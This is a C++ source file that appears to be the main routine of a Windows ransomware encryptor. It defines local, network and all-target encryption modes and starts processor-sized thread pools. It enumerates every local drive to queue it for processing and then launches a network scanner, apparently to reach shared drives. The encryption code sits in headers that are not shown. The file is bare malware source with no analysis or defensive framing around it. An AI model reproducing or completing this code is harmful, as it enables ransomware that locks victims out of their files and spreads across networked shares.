#include "common.h"
#include "filesystem/filesystem.h"
//#include "network_scanner.h"
#include "threadpool/threadpool.h"
#include <Shlwapi.h>
#include "global/global_parameters.h"
#include "network_scanner/network_scanner.h"

#pragma comment(lib, "Shell32.lib")


enum EncryptModes {

	ALL_ENCRYPT = 10,
	LOCAL_ENCRYPT = 11,
	NETWORK_ENCRYPT = 12

};

typedef struct string_ {

	WCHAR wszString[16384];
	TAILQ_ENTRY(string_) Entries;

} STRING, * PSTRING;

typedef TAILQ_HEAD(string_list_, string_) STRING_LIST, * PSTRING_LIST;

STATIC INT g_EncryptMode = ALL_ENCRYPT;
STATIC STRING_LIST g_HostList;
STATIC STRING_LIST g_PathList;

int main()
{
	HANDLE hLocalSearch = NULL;
	filesystem::DRIVE_LIST DriveList;
	//network_scanner::SHARE_LIST ShareList;

	TAILQ_INIT(&DriveList);
	//TAILQ_INIT(&ShareList);

	SYSTEM_INFO SysInfo;
	GetNativeSystemInfo(&SysInfo);

	DWORD dwLocalThreads = SysInfo.dwNumberOfProcessors;
	DWORD dwNetworkThreads = SysInfo.dwNumberOfProcessors;

	if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, dwLocalThreads)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Create(threadpool::NETWORK_THREADPOOL, dwNetworkThreads)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Start(threadpool::NETWORK_THREADPOOL)) {
		return EXIT_FAILURE;
	}

	if (filesystem::EnumirateDrives(&DriveList)) {

		filesystem::PDRIVE_INFO DriveInfo = NULL;
		TAILQ_FOREACH(DriveInfo, &DriveList, Entries) {
			threadpool::PutTask(threadpool::LOCAL_THREADPOOL, DriveInfo->RootPath);
		}

	}

	network_scanner::StartScan();
	threadpool::Wait(threadpool::LOCAL_THREADPOOL);
	threadpool::Wait(threadpool::NETWORK_THREADPOOL);
	return EXIT_SUCCESS;
}